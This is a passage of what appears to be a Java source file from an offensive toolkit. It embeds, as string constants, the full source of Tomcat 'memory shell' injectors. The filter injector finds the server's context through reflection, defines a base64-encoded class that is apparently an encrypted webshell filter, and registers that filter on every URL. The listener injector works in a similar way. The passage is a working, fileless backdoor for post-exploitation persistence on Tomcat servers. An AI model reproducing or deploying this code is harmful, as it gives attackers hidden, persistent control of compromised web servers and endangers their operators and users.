gAHAAAAWwFNK7YALBJctgBdTi0EtgBeLSu2AF/AAGBNpwA/Tiu2ACwSYbYAXToEGQQEtgBeGQQrtgBfOgUZBbYALBJctgBdOgYZBgS2AF4ZBhkFtgBfwABgTacABToELLAAAgACABoAHQAbAB4AVABXABsAAwBxAAAAPgAPAAAApAACAKcADACoABEAqQAaALQAHQCqAB4ArAApAK0ALwCuADcArwBDALAASQCxAFQAswBXALIAWQC2AHIAAABSAAgADAAOALEAsgADACkAKwCAALIABAA3AB0AswCQAAUAQwARAJMAsgAGAB4AOwC0AIEAAwAAAFsAcwB0AAAAAABbALUAZQABAAIAWQC2AGcAAgCFAAAALgAD/wAdAAMHAIYHAK0HAJ4AAQcAiP8AOQAEBwCGBwCtBwCeBwCIAAEHAIj6AAEAAQC3AAAAAgC4\");\n" +
                    "                Class var3 = (Class) var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);\n" +
                    "                MEMSHELL_OBJECT = var3.newInstance();\n" +
                    "            } catch (Exception var4) {\n" +
                    "            }\n" +
                    "        }\n" +
                    "\n" +
                    "    }\n" +
                    "\n" +
                    "    public static byte[] base64Decode(String bs) throws Exception {\n" +
                    "        byte[] value = null;\n" +
                    "\n" +
                    "        Class base64;\n" +
                    "        try {\n" +
                    "            base64 = Class.forName(\"java.util.Base64\");\n" +
                    "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
                    "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
                    "        } catch (Exception var6) {\n" +
                    "            try {\n" +
                    "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
                    "                Object decoder = base64.newInstance();\n" +
                    "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
                    "            } catch (Exception var5) {\n" +
                    "            }\n" +
                    "        }\n" +
                    "\n" +
                    "        return value;\n" +
                    "    }\n" +
                    "\n" +
                    "    static {\n" +
                    "        new TomcatListenerMemShell();\n" +
                    "    }\n" +
                    "}\n";

    public static final String TomcatFilterMemShell =
            "import java.lang.reflect.Constructor;\n" +
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.ArrayList;\n" +
            "import java.util.List;\n" +
            "import java.util.Map;\n" +
            "\n" +
            "public class TomcatFilterMemShell {\n" +
            "    public static Object STANDARD_CONTEXT;\n" +
            "    public static Object RESPONSE;\n" +
            "\n" +
            "    public TomcatFilterMemShell() {\n" +
            "        try {\n" +
            "            if (STANDARD_CONTEXT == null) {\n" +
            "                getStandardContext();\n" +
            "                getStandardContext1();\n" +
            "            }\n" +
            "            IMC();\n" +
            "            if (STANDARD_CONTEXT != null) {\n" +
            "                IMF();\n" +
            "            }\n" +
            "        } catch (Exception e) {\n" +
            "\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized void IMF() {\n" +
            "        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
            "\n" +
            "        try {\n" +
            "            String filterName = \"memshell.TomcatFilterShell\";\n" +
            "            Object filter = (Object) Thread.currentThread().getContextClassLoader().loadClass(filterName).newInstance();\n" +
            "            Class<?> Context = null;\n" +
            "            try {\n" +
            "                Context = classLoader.loadClass(\"org.apache.catalina.Context\"); //\n" +
            "            } catch (Exception e) {\n" +
            "            }\n" +
            "            Class<?> FilterDefClass = null;\n" +
            "            try {\n" +
            "                FilterDefClass = classLoader.loadClass(\"org.apache.catalina.deploy.FilterDef\"); // 6 7\n" +
            "            } catch (Exception e) {\n" +
            "                FilterDefClass = classLoader.loadClass(\"org.apache.tomcat.util.descriptor.web.FilterDef\"); // 8 9\n" +
            "            }\n" +
            "            Constructor FilterDefCons = FilterDefClass.getDeclaredConstructor();\n" +
            "            FilterDefCons.setAccessible(true);\n" +
            "            Object filterDef = FilterDefCons.newInstance();\n" +
            "            invoke(filterDef, \"setFilterName\", filterName);\n" +
            "            invoke(filterDef, \"setFilterClass\", filter.getClass().getName());\n" +
            "            invoke(STANDARD_CONTEXT, \"addFilterDef\", filterDef);\n" +
            "\n" +
            "            Class<?> filterMapClass = null;\n" +
            "            try {\n" +
            "                filterMapClass = classLoader.loadClass(\"org.apache.catalina.deploy.FilterMap\"); // 6 7\n" +
            "            } catch (Exception e) {\n" +
            "                filterMapClass = classLoader.loadClass(\"org.apache.tomcat.util.descriptor.web.FilterMap\"); // 8 9\n" +
            "            }\n" +
            "            Constructor FilterMapCons = filterMapClass.getDeclaredConstructor();\n" +
            "            FilterMapCons.setAccessible(true);\n" +
            "            Object FilterMapObj = FilterMapCons.newInstance();\n" +
            "            invoke(FilterMapObj, \"addURLPattern\", \"/*\");\n" +
            "            invoke(FilterMapObj, \"setFilterName\", filterName);\n" +
            "            invoke(STANDARD_CONTEXT, \"addFilterMap\", FilterMapObj);\n" +
            "\n" +
            "            Class<?> ApplicationFilterConfigClass = classLoader.loadClass(\"org.apache.catalina.core.ApplicationFilterConfig\");\n" +
            "            Constructor ApplicationFilterCons = ApplicationFilterConfigClass.getDeclaredConstructor(Context, FilterDefClass);\n" +
            "            ApplicationFilterCons.setAccessible(true);\n" +
            "            Object ApplicationfilterObj = ApplicationFilterCons.newInstance(STANDARD_CONTEXT, filterDef);\n" +
            "\n" +
            "            // https://www.cnblogs.com/yyhuni/p/shiroMemshell.html#1%E4%BB%8Epost%E8%AF%B7%E6%B1%82%E4%BD%93%E4%B8%AD%E5%8F%91%E9%80%81%E5%AD%97%E8%8A%82%E7%A0%81%E6%95%B0%E6%8D%AE\n" +
            "            Field getAppFilterConfigs =null;\n" +
            "            try{\n" +
            "                getAppFilterConfigs = STANDARD_CONTEXT.getClass().getSuperclass().getDeclaredField(\"filterConfigs\");\n" +
            "            }catch (Exception e){\n" +
            "                getAppFilterConfigs = STANDARD_CONTEXT.getClass().getDeclaredField(\"filterConfigs\");\n" +
            "            }\n" +
            "\n" +
            "            getAppFilterConfigs.setAccessible(true);\n" +
            "            Map filterConfigs = (Map) getAppFilterConfigs.get(STANDARD_CONTEXT);\n" +
            "            filterConfigs.put(filterName, ApplicationfilterObj);\n" +
            "\n" +
            "        } catch (Throwable var16) {\n" +
            "\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    private static Method getMethodByClass(Class cs, String methodName, Class... parameters) {\n" +
            "        Method method = null;\n" +
            "\n" +
            "        while (cs != null) {\n" +
            "            try {\n" +
            "                method = cs.getDeclaredMethod(methodName, parameters);\n" +
            "                cs = null;\n" +
            "            } catch (Exception var6) {\n" +
            "                cs = cs.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return method;\n" +
            "    }\n" +
            "\n" +
            "    private static Object invoke(Object obj, String methodName, Object... parameters) {\n" +
            "        try {\n" +
            "            ArrayList classes = new ArrayList();\n" +
            "            if (parameters != null) {\n" +
            "                for (int i = 0; i < parameters.length; ++i) {\n" +
            "                    Object o1 = parameters[i];\n" +
            "                    if (o1 != null) {\n" +
            "                        classes.add(o1.getClass());\n" +
            "                    } else {\n" +
            "                        classes.add((Object) null);\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "\n" +
            "            Method method = getMethodByClass(obj.getClass(), methodName, (Class[]) ((Class[]) classes.toArray(new Class[0])));\n" +
            "            return method.invoke(obj, parameters);\n" +
            "        } catch (Exception var7) {\n" +
            "            return null;\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
            "        Field var2 = null;\n" +
            "        Class var3 = var0.getClass();\n" +
            "\n" +
            "        while (var3 != Object.class) {\n" +
            "            try {\n" +
            "                var2 = var3.getDeclaredField(var1);\n" +
            "                break;\n" +
            "            } catch (NoSuchFieldException var5) {\n" +
            "                var3 = var3.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        if (var2 == null) {\n" +
            "            throw new NoSuchFieldException(var1);\n" +
            "        } else {\n" +
            "            var2.setAccessible(true);\n" +
            "            return var2.get(var0);\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void getStandardContext() throws Exception {\n" +
            "        boolean var0 = false;\n" +
            "        Thread[] var1 = (Thread[]) ((Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\"));\n" +
            "\n" +
            "        for (int var2 = 0; var2 < var1.length; ++var2) {\n" +
            "            Thread var3 = var1[var2];\n" +
            "            if (var3 != null) {\n" +
            "                String var4 = var3.getName();\n" +
            "//                if (!var4.contains(\"exec\") && var4.contains(\"http\")) {\n" +
            "                try {\n" +
            "                    if (var4.startsWith(\"http\")) {\n" +
            "                        Object var5 = getFV(var3, \"target\");\n" +
            "                        if (var5 instanceof Runnable) {\n" +
            "                            Object var6;\n" +
            "                            try {\n" +
            "                                var6 = getFV(getFV(getFV(var5, \"this$0\"), \"handler\"), \"global\");\n" +
            "                            } catch (Exception var17) {\n" +
            "                                continue;\n" +
            "                            }\n" +
            "\n" +
            "                            List var7 = (List) getFV(var6, \"processors\");\n" +
            "\n" +
            "                            for (int var8 = 0; var8 < var7.size(); ++var8) {\n" +
            "                                Object var9 = getFV(var7.get(var8), \"req\");\n" +
            "                                RESPONSE = var9.getClass().getMethod(\"getResponse\", (Class[]) (new Class[0])).invoke(var9);\n" +
            "\n" +
            "                                Object var10 = var9.getClass().getDeclaredMethod(\"getNote\", Integer.TYPE).invoke(var9, 1);\n" +
            "\n" +
            "                                try {\n" +
            "                                    Field var11 = var10.getClass().getDeclaredField(\"context\");\n" +
            "                                    var11.setAccessible(true);\n" +
            "                                    STANDARD_CONTEXT = var11.get(var10);\n" +
            "                                } catch (Exception var16) {\n" +
            "                                    Object var12 = var10.getClass().getDeclaredMethod(\"getServletContext\").invoke(var10);\n" +
            "                                    Field var13 = var12.getClass().getDeclaredField(\"context\");\n" +
            "                                    var13.setAccessible(true);\n" +
            "                                    Object var14 = var13.get(var12);\n" +
            "                                    Field var15 = var14.getClass().getDeclaredField(\"context\");\n" +
            "                                    var15.setAccessible(true);\n" +
            "                                    STANDARD_CONTEXT = var15.get(var14);\n" +
            "                                }\n" +
            "                                if (STANDARD_CONTEXT != null) {\n" +
            "                                    var0 = true;\n" +
            "                                    break;\n" +
            "                                }\n" +
            "\n" +
            "                            }\n" +
            "\n" +
            "                            if (var0) {\n" +
            "                                break;\n" +
            "                            }\n" +
            "                        }\n" +
            "                    }\n" +
            "                } catch (Exception e) {\n" +
            "                }\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    private void getStandardContext1() {\n" +
            "        try {\n" +
            "            Object request = Class.forName(\"com.opensymphony.webwork.ServletActionContext\").getMethod(\"getRequest\").invoke(null);\n" +
            "            Object servletContext = invokeMethod(request, \"getServletContext\");\n" +
            "            STANDARD_CONTEXT =  getFV(getFV(servletContext,\"context\"), \"context\");\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    private Object invokeMethod(Object obj,String methodName,Object... parameters){\n" +
            "        try {\n" +
            "            ArrayList classes = new ArrayList();\n" +
            "            if (parameters!=null){\n" +
            "                for (int i=0;i<parameters.length;i++){\n" +
            "                    Object o1=parameters[i];\n" +
            "                    if (o1!=null){\n" +
            "                        classes.add(o1.getClass());\n" +
            "                    }else{\n" +
            "                        classes.add(null);\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "            Method method=getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(new Class[]{}));\n" +
            "\n" +
            "            return method.invoke(obj, parameters);\n" +
            "        }catch (Exception e){\n" +
            "//        \te.printStackTrace();\n" +
            "        }\n" +
            "        return null;\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void IMC() {\n" +
            "        try {\n" +
            "            Thread.currentThread().getContextClassLoader().loadClass(\"memshell.TomcatFilterShell\");\n" +
            "        } catch (Exception var4) {\n" +
            "            try {\n" +
            "                Method var1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);\n" +
            "                var1.setAccessible(true);\n" +
            "                byte[] var2 = base64Decode(\"yv66vgAAADMBTgcAsQkARgCyBwCzCgADALQKAAMAtQkARgC2CgADALcKAEYAuAkARgC5CAC6CQBGALsHALwJAEYAvQkARgC+CQBGAL8KAMAAwQoAWwC0CADCCADDCADECgBbAMUKAFsAxggAxwoAyADJBwDKCgABAMsKABkAzAoAyADNCgDIAM4HAM8IANAKANEA0goAAQDTCgDRANQHANUKANEA1goAIwDXCgAjANgKAAEA2QgA2goAMQDbCADcBwDdCgAxAN4HAN8KAOAA4QoADADiCADjBwDkBwB6CADlCgAxAOYIAOcIAOgIAOkIAOoIAOsHAOwHAO0IAO4LADoA7wgA8AoAAQDxCwA6APILADoA8woARgD0CgBGAPUIAPYLAPcA+AcA+QoAMQD6CgBGAMUKAEYA+wsA9wD8CAD9CwA6APwHAP4KAE0AtAoADAD/CwA7AQAKAAEBAQoBAgEDCgAMALcKAE0BBAoARgEFCgABAQYIAQcIAQgLAQkBCgoAHgELBwEMBwENAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAAnhjAQASTGphdmEvbGFuZy9TdHJpbmc7AQADUHdkAQAEcGF0aAEAA21kNQEAAmNzAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMbWVtc2hlbGwvVG9tY2F0RmlsdGVyU2hlbGw7AQABbwEAEkxqYXZhL2xhbmcvT2JqZWN0OwEACGhhc2hDb2RlAQADKClJAQAGPGluaXQ+AQADKClWAQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAF6AQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwD5BwEOBwDPAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcAsQEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwcBDwEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwcBEAcBEQEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAWVG9tY2F0RmlsdGVyU2hlbGwuamF2YQEAEGphdmEvbGFuZy9TdHJpbmcMAGMAYgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAByAHMMARIBEwwAYQBiDAEUARUMAGUAiAwAZQBiAQAFVVRGLTgMAGYAYgEAEGphdmEvbGFuZy9PYmplY3QMAF0AXgwAXwBgDABkAGIHARYMARcBGAEAEDNjNmUwYjhhOWMxNTIyNGEBAARwQVMzAQAQL2Zhdmljb25kZW1vLmljbwwAcgB0DAEZARoBAANBRVMHAQ4MARsBHAEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAR0BHgwAcgEfDACYASAMASEBIgEAE2phdmEvbGFuZy9FeGNlcHRpb24BAANNRDUHASMMARsBJAwBJQBxDAEmAScBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBKAEeDAByASkMARQBKgwBKwEVAQAQamF2YS51dGlsLkJhc2U2NAwBLAEtAQAKZ2V0RW5jb2RlcgEAEltMamF2YS9sYW5nL0NsYXNzOwwBLgEvAQATW0xqYXZhL2xhbmcvT2JqZWN0OwcBMAwBMQEyDAEzATQBAA5lbmNvZGVUb1N0cmluZwEAD2phdmEvbGFuZy9DbGFzcwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMATUBNgEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAQWC1SZXF1ZXN0ZWQtV2l0aAwBNwCIAQAOWE1MSFRUUFJlcXVlc3QMATgBOQwBOgE7DAE8AIgMAJUAlgwAewB8AQAQbWVtc2hlbGwucGF5bG9hZAcBEAwBPQE+AQAabWVtc2hlbGwvVG9tY2F0RmlsdGVyU2hlbGwMAT8BQAwAdwB4DAFBAUIBAApwYXJhbWV0ZXJzAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MAGcAaAwBQwFEDAFFAUYHAUcMAUgBSQwBSgEeDACMAI0MAUUBKgEADlhtbEhUVFBSZXF1ZXN0AQAHU3VjY2VzcwcBSwwAnQFMDAFNAHMBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAE2phdmF4L2NyeXB0by9DaXBoZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvdXRpbC9PYmplY3RzAQAEaGFzaAEAFihbTGphdmEvbGFuZy9PYmplY3Q7KUkBAAtkZWZpbmVDbGFzcwEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7AQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAlnZXRIZWFkZXIBAAdpbmRleE9mAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAxnZXRQYXJhbWV0ZXIBAAxnZXRBdHRyaWJ1dGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEADHNldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAC3RvQnl0ZUFycmF5AQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBAA9wcmludFN0YWNrVHJhY2UAIQBGAFsAAQBcAAcAAQBdAF4AAAABAF8AYAAAAAAAYQBiAAAAAQBjAGIAAAABAGQAYgAAAAAAZQBiAAAAAQBmAGIAAAAMAAEAZwBoAAEAaQAAAG8AAwACAAAALyorwAABtQACKrsAA1m3AAQqtAACtgAFKrQABrYABbYAB7gACLUACSoSCrUACwSsAAAAAgBqAAAAEgAEAAAAGwAIABwAJwAdAC0AHgBrAAAAFgACAAAALwBsAG0AAAAAAC8AbgBvAAEAAQBwAHEAAQBpAAAAZQAEAAEAAAA7EAe9AAxZAyq0AA1TWQQqtAAOU1kFKrQABlNZBiq0AAJTWQcqtAAPU1kIKrQACVNZEAYqtAALU7gAEKwAAAACAGoAAAAGAAEAAAAjAGsAAAAMAAEAAAA7AGwAbQAAAAEAcgBzAAEAaQAAAGMAAgABAAAAISq3ABEqAbUADSoBtQAOKhIStQAGKhITtQACKhIUtQAPsQAAAAIAagAAAB4ABwAAACYABAARAAkAEgAOABMAFAAUABoAFQAgACcAawAAAAwAAQAAACEAbABtAAAAAQByAHQAAQBpAAAAmwADAAIAAABHKiu3ABUqAbUADSoBtQAOKhIStQAGKhITtQACKhIUtQAPKrsAA1m3AAQqtAACtgAFKrQABrYABbYAB7gACLUACSoSCrUAC7EAAAACAGoAAAAmAAkAAAArAAUAEQAKABIADwATABUAFAAbABUAIQAsAEAALQBGAC4AawAAABYAAgAAAEcAbABtAAAAAABHAHUAdgABAAEAdwB4AAEAaQAAAD0ABAACAAAACSorAyu+twAWsAAAAAIAagAAAAYAAQAAADEAawAAABYAAgAAAAkAbABtAAAAAAAJAHkAegABAAEAewB8AAEAaQAAANgABgAEAAAALBIXuAAYTi0cmQAHBKcABAW7ABlZKrQABrYAGhIXtwAbtgAcLSu2AB2wTgGwAAEAAAAoACkAHgADAGoAAAAWAAUAAAA2AAYANwAjADgAKQA5ACoAOgBrAAAANAAFAAYAIwB9AH4AAwAqAAIAfwCAAAMAAAAsAGwAbQAAAAAALACBAHoAAQAAACwAggCDAAIAhAAAADwAA/8ADwAEBwCFBwAyAQcAhgABBwCG/wAAAAQHAIUHADIBBwCGAAIHAIYB/wAYAAMHAIUHADIBAAEHAIcACQBlAIgAAQBpAAAApwAEAAMAAAAwAUwSH7gAIE0sKrYAGgMqtgAhtgAiuwAjWQQstgAktwAlEBC2ACa2ACdMpwAETSuwAAEAAgAqAC0AHgADAGoAAAAeAAcAAAA/AAIAQgAIAEMAFQBEACoARgAtAEUALgBIAGsAAAAgAAMACAAiAIIAiQACAAAAMACBAGIAAAACAC4AigBiAAEAhAAAABMAAv8ALQACBwCLBwCLAAEHAIcAAAkAjACNAAIAaQAAAUkABgAFAAAAeAFMEii4AClNLBIqAcAAK7YALCwBwAAttgAuTi22AC8SMAS9ADFZAxIyU7YALC0EvQAMWQMqU7YALsAAAUynADlOEjO4AClNLLYANDoEGQS2AC8SNQS9ADFZAxIyU7YALBkEBL0ADFkDKlO2AC7AAAFMpwAFOgQrsAACAAIAPQBAAB4AQQBxAHQAHgADAGoAAAAyAAwAAABMAAIAUAAIAFEAGwBSAD0AWgBAAFMAQQBVAEcAVgBNAFcAcQBZAHQAWAB2AFwAawAAAEgABwAbACIAjgBvAAMACAA4AI8AkAACAE0AJACOAG8ABABHAC0AjwCQAAIAQQA1AJEAgAADAAAAeACSAHoAAAACAHYAkwBiAAEAhAAAACkAA/8AQAACBwAyBwCLAAEHAIf/ADMABAcAMgcAiwAHAIcAAQcAh/kAAQCUAAAABAABAB4ACQCVAJYAAgBpAAABVQAGAAUAAACEAUwSKLgAKU0sEjYBwAArtgAsLAHAAC22AC5OLbYALxI3BL0AMVkDEgFTtgAsLQS9AAxZAypTtgAuwAAywAAywAAyTKcAP04SOLgAKU0stgA0OgQZBLYALxI5BL0AMVkDEgFTtgAsGQQEvQAMWQMqU7YALsAAMsAAMsAAMkynAAU6BCuwAAIAAgBDAEYAHgBHAH0AgAAeAAMAagAAADIADAAAAGAAAgBkAAgAZQAbAGYAQwBuAEYAZwBHAGkATQBqAFMAawB9AG0AgABsAIIAcABrAAAASAAHABsAKACXAG8AAwAIAD4AjwCQAAIAUwAqAJcAbwAEAE0AMwCPAJAAAgBHADsAkQCAAAMAAACEAJIAYgAAAAIAggCTAHoAAQCEAAAAKQAD/wBGAAIHAIsHADIAAQcAh/8AOQAEBwCLBwAyAAcAhwABBwCH+QABAJQAAAAEAAEAHgABAJgAmQACAGkAAAA1AAAAAgAAAAGxAAAAAgBqAAAABgABAAAAdgBrAAAAFgACAAAAAQBsAG0AAAAAAAEAmgCbAAEAlAAAAAQAAQCcAAEAnQCeAAIAaQAAAlkABQAIAAABVyorwAA6tQANKizAADu1AA4qtAANEjy5AD0CAMYA9iq0AA0SPLkAPQIAEj62AD8CnwDiKrQADbkAQAEAOgQqtAANKrQAArkAQQIAuABCOgUqGQUDtgBDOgUZBBJEuQBFAgDHACIZBBJEuwBGWSq2AC+2AEe3AEgZBbYASbkASgMApwCOKrQADRJLGQW5AEwDALsATVm3AE46BhkEEkS5AEUCAMAAMbYANDoHGQcZBrYAT1cZBxkFtgBPVxkHKrQADbYAT1cqtAAOuQBQAQAqtAAJAxAQtgBRtgBSGQe2AFNXKrQADrkAUAEAKhkGtgBUBLYAQ7gAVbYAUiq0AA65AFABACq0AAkQELYAVrYAUqcAPiq0AA0SPLkAPQIAxgAoKrQADRI8uQA9AgASV7YAPwKfABQqtAAOuQBQAQASWLYAUqcACy0rLLkAWQMApwAKOgQZBLYAWrEAAQAAAUwBTwAeAAMAagAAAGoAGgAAAHsACAB8ABAAfQAyAH4APQCAAE8AgQBYAIIAZACDAIMAhQCQAIYAmQCHAKoAiACyAIkAugCKAMQAiwDaAIwA4ACNAPkAjgEOAJABEQCRATMAkgFEAJUBTACZAU8AlwFRAJgBVgCbAGsAAABcAAkAmQB1AJ8AoAAGAKoAZAChAG8ABwA9ANEAogCjAAQATwC/AKQAegAFAVEABQClAIAABAAAAVcAbABtAAAAAAFXAKYApwABAAABVwCoAKkAAgAAAVcAqgCrAAMAhAAAABYAB/0AgwcArAcAMvkAigIyB0IHAIcGAJQAAAAGAAIArQCcAAEArgBzAAEAaQAAACsAAAABAAAAAbEAAAACAGoAAAAGAAEAAACfAGsAAAAMAAEAAAABAGwAbQAAAAEArwAAAAIAsA==\");\n" +
            "                var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);\n" +
            "            } catch (Throwable var3) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
